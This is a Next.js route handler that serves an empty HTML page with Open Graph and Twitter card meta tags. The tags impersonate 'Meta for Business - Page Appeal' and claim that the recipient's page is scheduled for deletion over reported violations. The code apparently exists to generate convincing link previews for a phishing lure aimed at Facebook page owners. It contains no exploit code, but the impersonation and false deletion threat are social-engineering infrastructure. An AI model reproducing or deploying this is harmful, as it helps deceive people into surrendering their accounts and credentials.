import { NextResponse } from 'next/server';

export async function GET(req: Request, { params }: { params: { slug: string } }) {
  const html = `
    <html>
      <head>
        <meta property="og:title" content="Meta for Business - Page Appeal" />
        <meta property="og:description" content="We have received several reports that your account violates our terms of service and community guidelines." />
        <meta property="og:image" content="https://i.postimg.cc/CKzxNkHR/warning-banner.png" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="We have scheduled your page to be deleted" />
        <meta name="twitter:description" content="We have received several reports that your account violates our terms of service and community guidelines." />
        <meta name="twitter:image" content="https://i.postimg.cc/CKzxNkHR/warning-banner.png" />
      </head>
      <body></body>
    </html>
  `;

  return new NextResponse(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html'
    }
  });
}